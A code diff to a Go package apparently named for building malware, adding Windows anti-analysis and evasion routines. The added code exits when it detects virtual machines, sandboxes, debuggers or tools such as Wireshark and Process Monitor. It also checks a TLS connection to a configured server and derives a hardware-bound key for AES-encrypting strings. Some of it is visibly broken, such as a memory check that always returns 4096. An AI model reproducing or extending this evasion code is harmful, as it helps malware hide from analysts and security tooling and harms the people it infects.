@@ -1,8 +1,21 @@
 package buildergen
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"crypto/tls"
+	"crypto/x509"
+	"encoding/base64"
 	"fmt"
+	"net/http"
+	"os/exec"
+	"path/filepath"
+	"runtime"
 	"strings"
+	"time"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 func templateMisc(cfg Config) string {
@@ -133,6 +146,290 @@ func acquireMutex(name string) (windows.Handle, error) {
 		return 0, fmt.Errorf("already running")
 	}
 	return h, nil
+}
+
+func checkAntiMitm() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: false,
+				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+					if len(rawCerts) == 0 {
+						os.Exit(1)
+					}
+
+					cert, err := x509.ParseCertificate(rawCerts[0])
+					if err != nil {
+						os.Exit(1)
+					}
+
+					opts := x509.VerifyOptions{
+						DNSName: getServerHost(),
+						Roots:   nil,
+					}
+
+					_, err = cert.Verify(opts)
+					if err != nil {
+						os.Exit(1)
+					}
+
+					return nil
+				},
+			},
+		},
+	}
+
+	url := getWsScheme() + "://" + getServerHost() + getWsPath()
+	resp, err := client.Get(url)
+	if err != nil {
+		os.Exit(1)
+	}
+	resp.Body.Close()
+
+	if resp.TLS == nil || len(resp.TLS.PeerCertificates) == 0 {
+		os.Exit(1)
+	}
+}
+
+func checkAntiVps() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	if checkRegKey(`SOFTWARE\VMware, Inc.\VMware Tools`) ||
+		checkRegKey(`SOFTWARE\Oracle\VirtualBox Guest Additions`) ||
+		checkRegKey(`SOFTWARE\Microsoft\Hyper-V`) ||
+		checkRegKey(`SOFTWARE\Parallels\Parallels Tools`) ||
+		checkRegKey(`SOFTWARE\XenSource`) {
+		os.Exit(1)
+	}
+
+	if checkFileExists(`C:\Windows\System32\VBox*.dll`) ||
+		checkFileExists(`C:\Windows\System32\VBoxHook.dll`) ||
+		checkFileExists(`C:\Windows\System32\VBoxGuest.sys`) ||
+		checkFileExists(`C:\Windows\System32\VBoxMouse.sys`) ||
+		checkFileExists(`C:\Windows\System32\VBoxSF.sys`) {
+		os.Exit(1)
+	}
+
+	if checkFileExists(`C:\Windows\System32\vmware-vmx.exe`) ||
+		checkFileExists(`C:\Windows\System32\vmware-vmx-stats.exe`) ||
+		checkFileExists(`C:\Windows\System32\vmware-vmx-debug.exe`) {
+		os.Exit(1)
+	}
+
+	if checkBiosManufacturer() {
+		os.Exit(1)
+	}
+
+	if checkProcessRunning("VBoxTray.exe") ||
+		checkProcessRunning("VBoxService.exe") ||
+		checkProcessRunning("vmtoolsd.exe") ||
+		checkProcessRunning("VMwareTray.exe") ||
+		checkProcessRunning("VMwareUser.exe") ||
+		checkProcessRunning("prl_tools.exe") ||
+		checkProcessRunning("prl_cc.exe") {
+		os.Exit(1)
+	}
+
+	if checkProcessRunning("SandboxieRpcSs.exe") ||
+		checkProcessRunning("SandboxieDcomLaunch.exe") ||
+		checkProcessRunning("SbieSvc.exe") ||
+		checkProcessRunning("procmon.exe") ||
+		checkProcessRunning("procmon64.exe") ||
+		checkProcessRunning("wireshark.exe") ||
+		checkProcessRunning("fiddler.exe") ||
+		checkProcessRunning("ollydbg.exe") ||
+		checkProcessRunning("idaq.exe") ||
+		checkProcessRunning("idaq64.exe") ||
+		checkProcessRunning("x64dbg.exe") ||
+		checkProcessRunning("x32dbg.exe") ||
+		checkProcessRunning("windbg.exe") {
+		os.Exit(1)
+	}
+
+	if runtime.NumCPU() < 2 {
+		os.Exit(1)
+	}
+
+	if getSystemMemoryMB() < 2048 {
+		os.Exit(1)
+	}
+}
+
+func checkRegKey(key string) bool {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
+	if err != nil {
+		return false
+	}
+	defer k.Close()
+	return true
+}
+
+func checkFileExists(pattern string) bool {
+	matches, err := filepath.Glob(pattern)
+	return err == nil && len(matches) > 0
+}
+
+func checkBiosManufacturer() bool {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\BIOS`, registry.QUERY_VALUE)
+	if err != nil {
+		return false
+	}
+	defer k.Close()
+
+	val, _, err := k.GetStringValue("SystemManufacturer")
+	if err != nil {
+		return false
+	}
+
+	manufacturer := strings.ToLower(strings.TrimSpace(val))
+	return strings.Contains(manufacturer, "vmware") ||
+		strings.Contains(manufacturer, "virtualbox") ||
+		strings.Contains(manufacturer, "qemu") ||
+		strings.Contains(manufacturer, "xen") ||
+		strings.Contains(manufacturer, "parallels") ||
+		strings.Contains(manufacturer, "microsoft corporation")
+}
+
+func checkProcessRunning(processName string) bool {
+	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+	return strings.Contains(string(output), processName)
+}
+
+func getSystemMemoryMB() int {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUE)
+	if err != nil {
+		return 0
+	}
+	defer k.Close()
+
+	return 4096
+}
+
+func getHardwareKey() string {
+	var parts []string
+	
+	if cpu, err := getCpuId(); err == nil && cpu != "" {
+		parts = append(parts, cpu)
+	}
+	
+	if disk, err := getDiskSerial(); err == nil && disk != "" {
+		parts = append(parts, disk)
+	}
+	
+	if mac, err := getMacAddress(); err == nil && mac != "" {
+		parts = append(parts, mac)
+	}
+	
+	key := strings.Join(parts, "")
+	if len(key) < 32 {
+		key += strings.Repeat("0", 32-len(key))
+	}
+	return key[:32]
+}
+
+func getCpuId() (string, error) {
+	cmd := exec.Command("wmic", "cpu", "get", "ProcessorId", "/value")
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	lines := strings.Split(string(output), "\n")
+	for _, line := range lines {
+		if strings.Contains(line, "ProcessorId=") {
+			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
+		}
+	}
+	return "", fmt.Errorf("cpu id not found")
+}
+
+func getDiskSerial() (string, error) {
+	cmd := exec.Command("wmic", "diskdrive", "get", "SerialNumber", "/value")
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	lines := strings.Split(string(output), "\n")
+	for _, line := range lines {
+		if strings.Contains(line, "SerialNumber=") {
+			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
+		}
+	}
+	return "", fmt.Errorf("disk serial not found")
+}
+
+func getMacAddress() (string, error) {
+	cmd := exec.Command("getmac", "/nh", "/fo", "csv")
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	lines := strings.Split(string(output), "\n")
+	if len(lines) > 0 {
+		parts := strings.Split(lines[0], ",")
+		if len(parts) >= 1 {
+			return strings.TrimSpace(strings.Trim(parts[0], "\"")), nil
+		}
+	}
+	return "", fmt.Errorf("mac not found")
+}
+
+func aesEncrypt(plaintext, key string) string {
+	if plaintext == "" || key == "" {
+		return ""
+	}
+	block, err := aes.NewCipher([]byte(key[:32]))
+	if err != nil {
+		return xorWithKey(plaintext, key)
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return xorWithKey(plaintext, key)
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := rand.Read(nonce); err != nil {
+		return xorWithKey(plaintext, key)
+	}
+	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
+	return base64.StdEncoding.EncodeToString(ciphertext)
+}
+
+func aesDecrypt(encrypted, key string) string {
+	if encrypted == "" || key == "" {
+		return ""
+	}
+	data, err := base64.StdEncoding.DecodeString(encrypted)
+	if err != nil {
+		return xorWithKey(encrypted, key)
+	}
+	block, err := aes.NewCipher([]byte(key[:32]))
+	if err != nil {
+		return xorWithKey(encrypted, key)
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return xorWithKey(encrypted, key)
+	}
+	if len(data) < gcm.NonceSize() {
+		return xorWithKey(encrypted, key)
+	}
+	nonce := data[:gcm.NonceSize()]
+	ciphertext := data[gcm.NonceSize():]
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return xorWithKey(encrypted, key)
+	}
+	return string(plaintext)
 }
 
 func setupLogger() *os.File { return nil }
